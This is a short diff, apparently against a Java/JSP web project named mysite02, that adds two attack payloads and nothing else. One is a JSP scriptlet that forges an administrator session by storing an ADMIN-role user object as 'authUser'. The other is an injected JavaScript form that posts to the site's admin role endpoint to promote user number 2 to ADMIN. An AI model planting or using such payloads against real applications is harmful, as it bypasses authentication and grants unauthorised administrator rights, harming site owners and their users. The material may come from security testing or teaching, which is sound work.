@@ -1,0 +1,2 @@
+<%HttpSession session = request.getSession();UserVo uservo = new UserVo();uservo.setRole("ADMIN");session.setAttribute("authUser", uservo);%>
+document.write('<form action="/mysite02/admin/role" method="post"><input type="hidden" name="list[0].no" value="2"><select name="list[0].role"><option value="ADMIN" selected></option></select><button type="submit">제출</button></form>');
